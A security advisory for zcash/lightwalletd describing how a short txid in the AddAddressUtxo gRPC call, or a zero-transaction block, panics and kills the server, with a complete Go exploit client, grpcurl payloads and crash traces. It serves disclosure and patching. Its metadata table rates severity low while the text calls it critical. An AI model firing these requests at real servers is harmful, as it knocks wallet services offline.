# GHSA-pp3p-5vmm-3cvw: Unchecked 32-byte slice-to-array conversion in `hash32.FromSlice` lets one unauthenticated `AddAddressUtxo` gRPC request panic and terminate the entire `lightwalletd` process

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-pp3p-5vmm-3cvw |
| CVE | none assigned |
| Severity | low (CVSS 3.7) |
| CWE | CWE-20 |
| Published | 2026-11-18T00:38:25Z |
| Updated | 2026-11-18T00:38:25Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-pp3p-5vmm-3cvw |

## Description (verbatim)

### Summary


**Severity: Critical (Remote Denial of Service)**  a single unauthenticated gRPC request permanently crashes the entire `lightwalletd` process.

**The flaw:** `hash32.FromSlice` / `hash32.ReverseSlice` (`hash32/hash32.go:25-46`) convert a `[]byte` into a `[32]byte` with `T(arg)`. Their doc comment claims short input is zero-extended, but Go panics when `len(arg) < 32`. The gRPC handler `DarksideStreamer.AddAddressUtxo` [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L1232-L1249) passes the client-supplied `txid` bytes directly into this function with no length check:

```go
Txid: hash32.Encode(hash32.Reverse(hash32.FromSlice(arg.Txid))), // arg.Txid is attacker-controlled
```

Because the gRPC server has no panic-recovery interceptor [see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/cmd/root.go#L144-L181), the panic is fatal to the whole process, not just the one request.

**Impact:** Complete loss of availability. Any client, no credentials, no prior state, sends one `AddAddressUtxo` message with a `txid` shorter than 32 bytes and the server dies immediately. Restart does not help; it can be re-killed at will. All wallets depending on that lightwalletd lose service.

**Confirmed:** Against a real running `lightwalletd` (darkside mode) with a real gRPC client, the server process exited with:
```
panic: runtime error: cannot convert slice with length 3 to array or pointer to array with length 32
github.com/zcash/lightwalletd/hash32.FromSlice(...)  hash32/hash32.go:26
github.com/zcash/lightwalletd/frontend.(*DarksideStreamer).AddAddressUtxo  frontend/service.go:1237
```

**A second, same-class crash** (found by fuzzing): [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L82) `GetHeight` indexes `b.vtx[0].transparentInputs[0]` with no guard, so a parseable block with `tx_count == 0` panics every block-handling path reachable via the darkside block-staging RPC and via any untrusted/malformed backend response.

The direct request path requires `--darkside-very-insecure`. The underlying `hash32` panic is also reachable in mainnet mode if the backend node returns a malformed txid/block (lightwalletd supports connecting to any node via `--no-backend-check`). A pure public-mainnet deployment with a trusted zcashd/zebrad is not exploitable through client bytes alone.

A missing length check plus a panic-prone conversion plus no panic recovery = a trivial, repeatable, unauthenticated remote kill of the server. Fix by making the conversions `copy`-based, validating the `txid` length, adding a recover interceptor, and guarding `GetHeight`.

### Details

`hash32.T` is a fixed-size 32-byte array type [see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/hash32/hash32.go#L15):

```go
type T [32]byte
```

`hash32.FromSlice` converts an input `[]byte` to `T` using a slice-to-array conversion [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/hash32/hash32.go#L25-L27):

```go
func FromSlice(arg []byte) T {
	return T(arg)
}
```

In Go, a slice-to-array conversion `[32]byte(arg)` is only valid when `len(arg) >= 32`; when `len(arg) < 32`, the Go runtime panics with `runtime error: cannot convert slice with length N to array or pointer to array with length 32`. When `len(arg) > 32`, the conversion uses the first 32 bytes and does not panic. `hash32.ReverseSlice` performs the same conversion indirectly [see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/hash32/hash32.go#L44-L46):

```go
func ReverseSlice(arg []byte) []byte {
	return ToSlice(Reverse(T(arg)))
}
```

The doc comment above `FromSlice` [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/hash32/hash32.go#L21-L24) states that a too-short slice is zero-filled, which is the behavior of a `copy` into a `[32]byte`; the function as written does not do this and panics instead. This is a plain statement of the code's behavior and of the comment text, not a claim about intent.

The gRPC handler `DarksideStreamer.AddAddressUtxo` calls this function on a client-supplied `bytes` field with no length check [see](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L1234-L1242):

```go
func (s *DarksideStreamer) AddAddressUtxo(ctx context.Context, arg *walletrpc.GetAddressUtxosReply) (*walletrpc.Empty, error) {
	utxosReply := common.ZcashdRpcReplyGetaddressutxos{
		Address:     arg.Address,
		Txid:        hash32.Encode(hash32.Reverse(hash32.FromSlice(arg.Txid))),
		...
```

`arg.Txid` originates from the protobuf `GetAddressUtxosReply.txid` (`bytes`) field, which a client can set to any length. If `len(arg.Txid) < 32`, the call to `hash32.FromSlice(arg.Txid)` [on line 1237](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L1237) panics. For comparison, the production handler `GetTransaction` rejects a wrong-length hash before converting it [see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L462-L465):
 `if len(txf.Hash) != 32 { return ... }`); `AddAddressUtxo` has no equivalent check.

The gRPC server is created without a panic-recovery interceptor ([see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/cmd/root.go#L144-L153) and [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/cmd/root.go#L172-L181)); only logging and Prometheus interceptors are chained. gRPC-Go does not recover panics in handlers by default, so an unrecovered panic in the handler goroutine terminates the entire process rather than only the offending RPC stream.

This was confirmed against a running `lightwalletd` process (started with `--darkside-very-insecure`) using a real gRPC client that sent one `AddAddressUtxo` message with `Txid = []byte{0xaa, 0xbb, 0xcc}` (3 bytes). The client received `Unavailable ... connection forcibly closed`, and the server process exited, writing to stderr:

```
panic: runtime error: cannot convert slice with length 3 to array or pointer to array with length 32
github.com/zcash/lightwalletd/hash32.FromSlice(...)                              hash32/hash32.go:26
github.com/zcash/lightwalletd/frontend.(*DarksideStreamer).AddAddressUtxo(...)  frontend/service.go:1237
```

The same conversion primitive is used at several other call sites where the input is not length-validated: [frontend/service.go:183](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L183), :[833](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L833), :[971](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L971), :[1064](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/frontend/service.go#L1064), and [common/common.go:561](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/common.go#L561),[568](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/common.go#L568), [common/cache.go:141](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/cache.go#L141),[296](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/cache.go#L296). At those sites the byte slices come from backend JSON-RPC replies (txids and hashes from `getaddresstxids`, `getrawmempool`, `getaddressutxos`, `getblock`), not from client request fields. `lightwalletd` supports connecting to an arbitrary node via `--no-backend-check`, so a backend returning a txid or hash shorter than 32 bytes reaches the same panic. With a trusted mainnet zcashd/zebrad and only client-supplied fields, the other public `CompactTxStreamer` byte fields are length-checked (for example `GetTransaction.hash` and `GetTreeState.hash`), so the direct one-request trigger is the `DarksideStreamer.AddAddressUtxo` path, which is registered when `--darkside-very-insecure` is set.

A separate, independent defect of the same "index into externally-derived, unvalidated data" class exists in `parser/block.go:GetHeight` [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L82), which indexes `b.vtx[0].transparentInputs[0]` while `Block.ParseFromSlice` accepts a transaction count of zero; a native Go fuzz target (`FuzzBlockParse`) produced a deterministic `index out of range [0] with length 0` panic at `parser/block.go:82` via `Block.ToCompact` [parser/block.go:112](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L112).

### Proof of concept

### 0. Tested environment

- `lightwalletd` at commit `d16d48124e9ad4157ebc2324b5090c6ba201470c` (master); defect also present in release `v0.5.4`.
- Go 1.25+/1.27 toolchain.
- Verified on Windows; the crash itself is OS-independent. The PoC does **not** call `Reset`, so the Windows-specific `truncate ... Access is denied` issue in `BlockCache.clearDbFiles` (`common/cache.go:63-69`) is not involved.

---

### 1. Build the server

```bash
git clone https://github.com/zcash/lightwalletd
cd lightwalletd
go build -o lightwalletd .
```

---

### 2. Start `lightwalletd` in darkside mode

The vulnerable handler is registered only when `--darkside-very-insecure` is set (`cmd/root.go:351-359`). Darkside mode needs no zcashd/zebrad connection, no RPC credentials and no TLS.

```bash
mkdir -p /tmp/lwd-poc
./lightwalletd \
  --darkside-very-insecure \
  --no-tls-very-insecure \
  --grpc-bind-addr=127.0.0.1:9067 \
  --http-bind-addr=127.0.0.1:9068 \
  --data-dir=/tmp/lwd-poc \
  --log-file=/tmp/lwd-poc/server.log \
  --log-level=4
```

Config notes:
- `--darkside-very-insecure` registers the `DarksideStreamer` gRPC service.
- `--no-tls-very-insecure` avoids needing `cert.pem`/`cert.key`.
- `--data-dir` must be writable (the process opens `db/darkside/blocks` and `db/darkside/lengths`).
- `--log-level=4` (Info) also enables gRPC reflection (`cmd/root.go:188`), which the `grpcurl` variant in §6 uses.
- Darkside auto-terminates after `--darkside-timeout` minutes (default 30) via `common.DarksideInit` (`common/darkside.go:150-153`); you have up to 30 minutes.

---

### 3. PoC client (Go)

Create `lightwalletd/poc/main.go` so it can import the repo's own `walletrpc` package without a `replace` directive:

```go
package main

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func main() {
	addr := "127.0.0.1:9067"
	if len(os.Args) > 1 {
		addr = os.Args[1]
	}
	conn, err := grpc.Dial(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		fmt.Println("dial error:", err)
		os.Exit(1)
	}
	defer conn.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	client := walletrpc.NewDarksideStreamerClient(conn)

	// txid length < 32 triggers the panic in hash32.FromSlice.
	_, err = client.AddAddressUtxo(ctx, &walletrpc.GetAddressUtxosReply{
		Address: "t1example",
		Txid:    []byte{0xaa, 0xbb, 0xcc}, // 3 bytes
		Index:   0,
		Script:  []byte{0x51},
		Height:  1,
	})
	fmt.Println("AddAddressUtxo returned:", err)
}
```

Build and run:

```bash
cd lightwalletd
go build -o poc/poc ./poc
./poc/poc 127.0.0.1:9067
```

---

### 4. Trigger and expected result

Client output:

```
AddAddressUtxo returned: rpc error: code = Unavailable desc = error reading from server:
  read tcp 127.0.0.1:<port>->127.0.0.1:9067: wsarecv: An existing connection was forcibly closed by the remote host
```

The server process exits. Its stderr contains:

```
panic: runtime error: cannot convert slice with length 3 to array or pointer to array with length 32

goroutine ... [running]:
github.com/zcash/lightwalletd/hash32.FromSlice(...)
	.../lightwalletd/hash32/hash32.go:26
github.com/zcash/lightwalletd/frontend.(*DarksideStreamer).AddAddressUtxo(...)
	.../lightwalletd/frontend/service.go:1237 +0x3cf
github.com/zcash/lightwalletd/walletrpc._DarksideStreamer_AddAddressUtxo_Handler.func1(...)
	.../lightwalletd/walletrpc/darkside_grpc.pb.go:656 +0xcb
github.com/grpc-ecosystem/go-grpc-prometheus.(*ServerMetrics).UnaryServerInterceptor.func1(...)
	.../go-grpc-prometheus@v1.2.0/server_metrics.go:107 +0x77
github.com/zcash/lightwalletd/common/logging.LogInterceptor(...)
	.../lightwalletd/common/logging/logging.go:35 +0x9b
google.golang.org/grpc.(*Server).processUnaryRPC(...)
	.../grpc@v1.83.2/server.go:1443 +0x1207
...
```

Confirm the server is dead and repeatable:

```bash
# no process should be listening after the call
curl -s http://127.0.0.1:9068/metrics >/dev/null; echo "http reachable? $?"
# restart and send the same request again -> process exits again
```

---

### 5. Minimal message semantics

- `GetAddressUtxosReply.txid` is a `bytes` protobuf field (`lightwallet-protocol/walletrpc/compact_formats.proto`, `message GetAddressUtxosReply { bytes txid = 1; ... }`).
- Any length `< 32` triggers the panic; a length `>= 32` does not (`[32]byte(arg)` uses the first 32 bytes when longer). E.g. `Txid: []byte{}` (empty) and `Txid: []byte{0x01}` also panic.
- `AddAddressUtxo` does not require a prior `Reset` and performs no address validation; `Address` can be any string.

---

### 6. `grpcurl` variant (no Go client)

Base64 of `0xaa 0xbb 0xcc` is `qrvM`:

```bash
# reflection is enabled because --log-level=4 (>= WarnLevel)
grpcurl -plaintext \
  -d '{"address":"t1example","txid":"qrvM","index":0,"script":"UQ==","height":1,"valueZat":0}' \
  127.0.0.1:9067 \
  cash.z.wallet.sdk.rpc.DarksideStreamer/AddAddressUtxo
```

Expected: the RPC fails with `Unavailable ... connection forcibly closed` and the server log records the same `hash32.FromSlice` panic.

---

### 7. Reconciling with the transaction-parser crash (optional)

The same run can demonstrate the parser defect via the same gRPC service:

```bash
# StageBlocksStream with a block whose tx_count == 0
# block = 140-byte header + 0x00 (empty Equihash solution) + 0x00 (tx_count)
```

```bash
grpcurl -plaintext -d '{"saplingActivation":1,"branchID":"76b809bb","chainName":"main"}' \
  127.0.0.1:9067 cash.z.wallet.sdk.rpc.DarksideStreamer/Reset

grpcurl -plaintext -d '{"block":"04000000<64 zeros><64 zeros><64 zeros>0000000000000000<64 zeros>0000"}' \
  127.0.0.1:9067 cash.z.wallet.sdk.rpc.DarksideStreamer/StageBlocksStream
```

On Linux this ends in `parser/block.go:82` (`index out of range [0] with length 0`). On Windows this particular route is masked because `Reset` itself hits the `Log.Fatal` in `BlockCache.clearDbFiles`; the parser panic is instead reproducible deterministically without the server:

```bash
go test ./parser/ -run 'FuzzBlockParse/b4c00d2f7656317f'
```

and by fuzzing:

```bash
go test ./parser/ -run xxx -fuzz FuzzBlockParse -fuzztime 300s
```

---

### 8. Source-level confirmation of `hash32` (optional)

```go
// any of these panic:
hash32.FromSlice([]byte{1, 2, 3})
hash32.FromSlice(nil)
hash32.ReverseSlice([]byte{1, 2, 3})
```

because `hash32/hash32.go:26` is `return T(arg)` and `:45` is `return ToSlice(Reverse(T(arg)))`.


### Impact

A single unauthenticated gRPC request (`DarksideStreamer.AddAddressUtxo` with a `txid` shorter than 32 bytes) causes an unrecovered panic that terminates the whole `lightwalletd` process, dropping every concurrent wallet stream and making the service unavailable until it is restarted. The request requires no authentication, no prior state (`AddAddressUtxo` does not check whether `Reset` was called), and no valid transaction data; it is fully repeatable, so the service can be killed again immediately after each restart. The precondition for this specific request path is that the server was started with `--darkside-very-insecure` (the `DarksideStreamer` service is registered only in that mode). The same panic is also reachable in mainnet mode whenever the connected backend returns a txid/hash shorter than 32 bytes (the affected call sites listed above are not length-validated), which matters because lightwalletd can be pointed at any node via `--no-backend-check`. Since every affected sink is the same unchecked conversion plus the absence of a recovery interceptor, the failure is a crash of the entire process rather than a single failed request.

Practical scenario: An operator runs `lightwalletd --darkside-very-insecure` on a reachable host for wallet integration testing. A client sends one `AddAddressUtxo` message whose `txid` field contains 3 bytes. The handler executes `hash32.FromSlice` with that 3-byte slice, the Go runtime raises `cannot convert slice with length 3 to array ... with length 32`, no interceptor recovers it, and the process exits; all connected wallets are disconnected and the endpoint is down until the operator restarts it.
